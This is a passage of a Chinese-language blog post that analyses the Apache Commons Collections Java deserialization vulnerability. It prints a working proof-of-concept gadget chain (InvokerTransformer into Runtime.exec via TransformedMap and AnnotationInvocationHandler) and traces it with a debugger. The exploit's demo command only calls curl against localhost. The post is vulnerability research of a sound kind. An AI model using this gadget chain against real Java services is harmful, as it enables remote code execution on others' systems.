class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"curl http://127.0.0.1:8888"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"2"</span>);</span><br><span class="line"></span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object poc = ctor.newInstance(java.lang.annotation.Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(poc);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也用了 AnnotationInvocationHandler 这个类，如果前面都跟过一遍的话，还是比较好理解的。</p>
<p>在 AnnotationInvocationHandler 的 readObject() 中打个断点。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/45.png" alt="45"></p>
<p>可以看到 var4 从 memberValues 里取到一个迭代器，其实这个迭代器来自我们 poc 里的 HashMap。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/46.png" alt="46"></p>
<p>实际是通过<code>HashMap.entrySet().iterator()</code>获得，可以通过这个迭代器去遍历 HashMap。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/47.png" alt="47"></p>
<p>回到  AnnotationInvocationHandler 的 readObject() 中。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/48.png" alt="48"></p>
<p>var5 是 MapEntry 对象，这里调用了 MapEntry 的 setValue() 方法。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/49.png" alt="49"></p>
<p>在 MapEntry 的 setValue() 方法中，会调用我们精心构造的 TransformedMap 对象的 checkSetValue() 方法，下面就开始触发漏洞啦。</p>
<p>这是根据 poc 进行的分析，那我们现在可以尝试从构造 poc 的角度去分析。</p>
<p>在前面，我们找到了 TransformedMap 类的 checkSetValue() 方法，以该方法为思路，寻找哪里调用了该方法。</p>
<p>AbstractInputCheckedMapDecorator 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/50.png" alt="50"></p>
<p>MapEntry 是 AbstractInputCheckedMapDecorator 的一个内部类，而 AbstractInputCheckedMapDecorator  又是 TransformedMap 的父类。</p>
<p>EntrySetIterator 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/51.png" alt="51"></p>
<p>EntrySetIterator 也是 AbstractInputCheckedMapDecorator 的一个内部类，其中的 next() 方法实例化了 MapEntry 类，顺着 EntrySetIterator 类去找。</p>
<p>EntrySet 类</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/52.png" alt="52"></p>
<p>EntrySet 这还是 AbstractInputCheckedMapDecorator 的一个内部类，其 Iterator() 方法会返回 EntrySetIterator 对象，在  AbstractInputCheckedMapDecorator 的 entrySet() 方法中，会创建 EntrySet 对象。因为 TransformedMap 继承自 AbstractInputCheckedMapDecorator，所以我们直接调用 TransformedMap 对象的 entrySet() 方法即可。</p>
<p>结合这些分析，找到了符合条件的 AnnotationInvocationHandler 的 readObject() 方法。</p>
<p>在 poc 中，还需要注意 AnnotationInvocationHandler 对象的 type 值。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/53.png" alt="53"></p>
<p>参考文章写到</p>
<blockquote>
<p>需要注意,这里的触发的类为 AnnotationInvocationHandler，在触发漏洞事会对 type 进行检查，所以在 transformer 的时候我们要讲 type 设置为 annotation 类型。</p>
</blockquote>
<p>那我们是怎么知道的呢？</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/54.png" alt="54"></p>
<p>可以看到这里 var2 为 AnnotationType 对象，通过其 memberTypes() 方法取到了一个 HashMap 赋值给 var3，其映射关系中的键名为 value，这里 var6 来自我们 poc 中创建的 HashMap，如果 var6 不等于 value，代码逻辑就进不到下面的 if 分支。</p>
<p>如果我们改成 Override。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/55.png" alt="55"></p>
<p>可以看到这样就进不到 if 分支了，这是因为 AnnotationType 的 memberTypes() 方法返回的 map 中，映射关系是注解的参数名和参数类型。</p>
<p>参考：<code>http://www.docjar.com/docs/api/sun/reflect/annotation/AnnotationType.html</code></p>
<p>Retention 注解</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/56.png" alt="56"></p>
<p>Override 注解</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/57.png" alt="57"></p>
<p>我们可以自定义一个注解进行验证。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> LAnnotation &#123;</span><br><span class="line">    <span class="function">String <span class="title">llfam</span><span class="params">()</span> <span class="keyword">default</span> "llfam"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后修改 poc。</p>
<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/learningApacheCommonsCollections/58.png" alt="58"></p>
<p>这里不但改了 map 中的 key，也把 value 改成了 88，至于为什么 value 也要改，感兴趣的话可以自己研究一下 : ）</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我第一次分析 java 的漏洞，我本来想尽量写详细一点，但是 java 的知识比较多，加上自己现在的理解还不够，可以当作入门 java 审计的一个参考吧，欢迎交流 : )</p>
<p>全文 poc 来自参考文章以及 ysoserial，稍有修改。</p>
<p>ref ：</p>
<p><code>https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/</code></p>
<p><code>https://p0sec.net/index.php/archives/121/</code></p>
<p><code>https://blog.csdn.net/Dream_Weave/article/details/84183247</code></p>
<p><code>https://xz.aliyun.com/t/4558#toc-0</code></p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="http://yoursite.com">ll</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="http://yoursite.com/2019/09/03/Apache-CommonsCollections_学习/">http://yoursite.com/2019/09/03/Apache-CommonsCollections_学习/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/java/">java</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2019/09/09/xunruicms_4.3.1_xss/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">xunruicms 4.3.1 xss</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/2019/08/29/mysql_5.7_root_登录问题/">
        <span class="next-text nav-default">mysql 5.7 root 登录问题</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/LLfam" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2019<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">ll</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
